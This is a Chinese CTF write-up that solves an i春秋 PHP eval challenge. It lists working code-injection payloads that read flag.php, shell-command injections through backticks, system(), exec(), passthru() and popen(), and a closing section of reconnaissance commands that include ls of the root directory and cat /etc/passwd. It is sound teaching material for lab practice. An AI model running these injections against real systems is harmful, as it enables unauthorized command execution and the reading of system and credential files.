---
title: 【i春秋】 Web —— 爆破-2
copyright: true
date: 2018-08-31 20:16:04
tags: [i春秋,CTF,writeup,audit,php,bash]
categories: [InfoSec,Web]
---

# 0x00 前言

此题出自「百度杯」CTF 比赛 2017 二月场，是第二道 「爆破」系列的 Web 题，重点考察大家对 PHP **文件系统函数**与**命令执行函数**的熟练度，难度中低，需要的基础知识有：**PHP、Bash**。

题目链接在「i春秋」的 CTF 大本营，解题链接通过创建在线靶场后得到：

- 题目链接：[https://www.ichunqiu.com/battalion?t=1&r=57475](https://www.ichunqiu.com/battalion?t=1&r=57475)

<!-- more -->

![question](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/question.png)

# 0x01 利用文件系统函数

打开链接，发现 PHP 源码与第一题的类似，只不过是少了对 `hello` 参数值的正则匹配：

```php
<?php
include "flag.php";
$a = @$_REQUEST['hello'];
eval( "var_dump($a);");
show_source(__FILE__);
```

根据提示，flag 不再藏于某变量中，再由第 2 行的文件包含语句，推测 flag 应该在 flag.php 文件里。

因此，我们先尝试利用[文件系统函数](http://php.net/manual/en/ref.filesystem.php)来读取 flag.php 文件的内容，本题依旧与「爆破」关系不大。

## file()

[`file()`](http://php.net/manual/en/function.file.php) 函数用于将整个文件读入数组中。

尝试构造 payload `hello=file("flag.php")`，提交后直接看到 flag，证明推测正确：

![file](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/file.png)

## file_get_contents()

[`file_get_contents()`](http://php.net/manual/en/function.file-get-contents.php) 函数用于将整个文件读入到一个字符串中。

尝试构造 payload `hello=file_get_contents("flag.php") `，提交后竟未显示 flag？这是因为 flag.php 文件中的内容以界定符 `<?php` 开头，所以输出到浏览器时，该字符串被当做 PHP 脚本不予显示。但不必担心，右击页面空白处，查看网页源代码，即可看到 flag：

![file_get_contents](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/file_get_contents.png)

## show_source()

[`show_source()`](http://php.net/manual/en/function.show-source.php) 函数等同于 [`highlight_file()`](http://php.net/manual/en/function.highlight-file.php) 函数，可将一个 PHP 脚本文件语法高亮。

尝试构造 payload `hello=show_source("flag.php")`，提交后能看到语法高亮后的 flag：

![show_source](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/show_source.png)

## readfile()

[`readfile()`](http://php.net/manual/en/function.readfile.php) 函数用于读取一个文件并写入到输出缓冲区。

在提交 payload `hello=readfile("flag.php")` 后，在网页源代码处可看到 flag：

![readfile](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/readfile.png)

## fread()

[`fread()`](http://php.net/manual/en/function.fread.php) 函数用于读取二进制文件，不过首先得用 [`fopen()`](http://php.net/manual/en/function.fopen.php) 函数创建文件句柄，填入第一个参数，并在第二个参数中填入可读取的最大字节数。

因此，构造 payload `hello=fread(fopen("flag.php","r"),100)`，提交后在网页源代码处可看到 flag：

![fread](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/fread.png)

以上是直接读取脚本文件源码的常见函数，感兴趣的读者可深入研究。

# 0x02 利用命令执行函数

下面介绍另一种获取文件内容的方式，即利用 PHP 中的[命令执行函数](http://php.net/manual/en/ref.exec.php)，通过执行系统命令以显示文件内容。

首先，由预定义常量 [`PHP_OS`](http://php.net/manual/en/reserved.constants.php) 可知后台操作系统的类型，构造 `hello=PHP_OS` 提交后，发现是 Linux 操作系统：

![php_os](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/php_os.png)

## 执行运算符

PHP 的[执行运算符](http://php.net/manual/en/language.operators.execution.php)为反引号「`」，可将反引号之间的内容作为 shell 命令执行，并返回所有执行结果。

在构造 payload 之前，需要做两件事：

- 闭合前面的 `var_dump(` 字符串。
- 注释后面的 `);` 字符串。

因此，构造 payload ``hello=);echo `cat flag.php`;//``，提交后在网页源代码处即可看到 flag：

![backticks](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/backticks.png)

## system()

[`system()`](http://php.net/manual/en/function.system.php) 函数用于执行外部程序，输出执行结果，并返回结果的最后一行。

因此，在提交 payload `hello=);echo system("cat flag.php");//` 后，在网页源代码处可看到两个 flag，是因为第一个 flag 是由输出结果而得，第二个 flag 是由返回值而得：

![system](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/system.png)

## exec()

[`exec()`](http://php.net/manual/en/function.exec.php) 函数用于执行一个外部程序，并返回结果的最后一行。

因此，在提交 payload `hello=);echo exec("cat flag.php");//` 后，直接可见 flag，因此 flag 正好是 flag.php 文件中的最后一行：

![exec](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/exec.png)

## shell_exec()

[`shell_exec()`](http://php.net/manual/en/function.shell-exec.php) 函数可通过 shell 环境执行命令，并返回所有执行结果，本函数功能与执行运算符相同。

因此，构造 payload `hello=);echo shell_exec("cat flag.php");//`，提交后在网页源代码处即可看到 flag：

![shell_exec](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/shell_exec.png)

## passthru()

[`passthru()`](http://php.net/manual/en/function.passthru.php) 函数用于执行外部函数，并输出原始执行结果，没有返回值。

因此，构造 payload `hello=);echo passthru("cat flag.php");//`，提交后在网页源代码处即可看到 flag：

![passthru](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/passthru.png)

## popen()

[`popen()`](http://php.net/manual/en/function.popen.php) 函数用于创建指向命令执行进程的文件句柄，与 `fopen()` 函数类似，最后将通过 `fread()` 函数读取命令执行的结果。

因此，构造 payload `hello=);echo fread(popen("cat flag.php","r"),100);//`，提交后在网页源代码处即可看到 flag：

![popen](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/popen.png)

以上是通过执行系统命令打印出文件内容的常见函数，感兴趣的读者可深入研究。

# 0x03 题外话

既然能执行系统命令，可拓展的思路那就多了，比如存在目录遍历漏洞、查看当前 Linux 版本信息、查看当前网卡信息、查看当前进程信息、查看所有用户信息等。

下面以 `pathssru()` 函数为例，简单地介绍一下命令执行漏洞的利用方法。

## 目录遍历漏洞

[目录遍历漏洞](https://en.wikipedia.org/wiki/Directory_traversal_attack)是由于系统未过滤用户输入的目录跳转符 `../`，导致恶意用户可通过不断提交若干个目录跳转符，从而遍历系统中的所有目录。

经过笔者不断尝试，查看大部分目录下有哪些文件是没问题的，如提交 payload `hello=);echo passthru("ls ../../../");//` 后，即可看到根目录下的所有文件：

![ls](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/ls.png)

## 查看当前 Linux 版本信息

通过 `uname -a` 命令可查看当前 Linux 版本信息。

因此，构造 payload `hello=);echo passthru("uname -a");//`，提交后可见当前 Linux 内核版本为 `3.10.0-514.26.2.el7.x86_64 `：

![uname](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/uname.png)

## 查看当前网卡信息

通过 `ifconfig` 命令可查看当前网卡信息。

因此，构造 payload `hello=);echo passthru("ifconfig");//`，提交后可见 eth0 网卡的 IP 地址为 `172.17.0.26`：

![ifconfig](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/ifconfig.png)

## 查看当前进程信息

通过 `ps aux` 命令可查看当前进程信息。

因此，构造 payload `hello=);echo passthru("ps aux");//`，提交后可见当前所有进程的信息：

![ps](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/ps.png)

## 查看所有用户信息

通过 `cat /etc/passwd ` 命令可查看所有用户信息。

因此，构造 payload `hello=);echo passthru("cat /etc/passwd");//`，提交后可见当前所有用户的信息：

![passwd](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_2/passwd.png)

其中当前的用户名是 `apache`，不要问我是怎么知道的。

到此为止，这道题就告一段落了，读者感兴趣的话可挖掘更多的玩法，只可惜当前用户不是 root，不然可玩性就更高了：)